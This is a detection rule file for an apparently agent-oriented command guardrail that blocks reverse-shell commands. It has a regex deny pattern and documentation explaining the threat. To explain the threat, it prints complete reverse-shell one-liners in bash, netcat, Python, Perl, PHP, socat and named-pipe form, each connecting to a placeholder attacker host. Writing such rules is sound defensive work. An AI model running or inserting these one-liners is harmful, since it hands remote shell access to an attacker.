---
name: no-reverse-shell
version: "1.0.0"
domain: sectors/cybersecurity
description: Detect and block reverse shell patterns in executed commands
schema_version: 1
match:
  actions: ["execute"]
  contexts:
    content_pattern: "bash -i.*>&.*\\/dev\\/tcp|nc -e|ncat -e|netcat -e|python.*pty\\.spawn|python.*socket.*connect.*subprocess|perl.*socket.*INET|ruby.*TCPSocket|php.*fsockopen.*exec|socat.*TCP|mknod.*\\/tmp\\/.*p.*nc|\\|.*\\/bin\\/(ba)?sh|exec.*<>\\/dev\\/tcp"
verdict: DENY
severity: CRITICAL
priority: 400
author: sovraine
license: CC-BY-SA-4.0
tags: [reverse-shell, remote-access, c2, backdoor, network]
signature: null
certified: false
---

## What it does

Detects and blocks common reverse shell patterns across all major languages and tools.

## Why it exists

A reverse shell gives an attacker interactive shell access to the victim's machine by having the victim connect OUT to the attacker (bypassing firewalls):

**Common patterns detected:**
```
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Netcat
nc -e /bin/sh attacker.com 4444

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh"])'

# Perl
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");exec("/bin/sh")'

# PHP
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Socat
socat TCP:attacker.com:4444 EXEC:/bin/sh

# Named pipe
mknod /tmp/pipe p && nc attacker.com 4444 0</tmp/pipe | /bin/sh 1>/tmp/pipe
```

In the nirholas attack, the PTY server is a more sophisticated version of a reverse shell — it uses WebSockets instead of raw TCP, but the effect is the same: remote interactive shell access.

## What gets blocked

- `execute` — any command matching known reverse shell patterns
- All major languages: bash, python, perl, ruby, php, netcat, socat
- Pipe-based and file descriptor-based reverse shell variants

## What is still allowed

- Legitimate uses of `nc` for debugging (without `-e` flag)
- Python socket programming that doesn't chain to subprocess/shell
- SSH connections (legitimate remote access)

## How to override

An authorized penetration testing engagement must be created with signed rules of engagement (ROE), target scope, and time boundaries. The engagement ID must be passed in the action context. Outside of an authorized engagement, reverse shell patterns are unconditionally blocked with no user override possible.
